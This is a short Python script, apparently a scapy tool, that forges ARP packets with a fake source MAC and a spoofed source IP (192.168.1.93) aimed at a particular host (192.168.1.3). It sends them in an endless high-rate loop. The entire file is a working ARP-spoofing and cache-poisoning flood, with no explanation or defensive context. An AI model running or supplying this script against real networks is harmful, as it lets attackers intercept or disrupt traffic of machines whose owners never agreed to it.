#!/usr/bin/python

import sys 
from scapy.all import *
p=Ether()/ARP()
ls(p)
p.hwsrc="aa:aa:aa:aa:aa:aa"
p.psrc="192.168.1.93"
p.hwdst="d4:be:d9:dc:a7:9e"
p.pdst="192.168.1.3"
#send(a)
while 1:sendp(p,inter=0.002,count=10000)

